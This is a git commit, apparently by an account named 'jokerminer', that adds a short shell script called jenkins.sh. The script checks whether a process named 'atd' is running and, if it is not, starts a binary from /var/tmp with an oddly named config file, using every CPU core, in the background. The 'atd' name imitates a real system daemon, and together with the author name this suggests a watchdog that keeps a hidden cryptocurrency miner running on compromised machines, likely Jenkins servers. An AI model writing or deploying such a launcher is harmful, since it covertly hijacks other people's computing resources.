58edc69571c1aceb8bf83b9b594a711f41262cf3
jokerminer <34443698+attackjoker11@users.noreply.github.com>
2018-01-17 07:33:04 +0530

    Add files via upload

---
+++ jenkins.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+count=$(ps -ef | grep -v grep | grep atd | grep conf| wc -l)
+thread=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1)
+echo $count
+if [ $count -lt 1 ]; then
+cd /var/tmp && ./atd -c honvbsasbf.conf -t $thread -B
+else
+echo "fine"
+fi
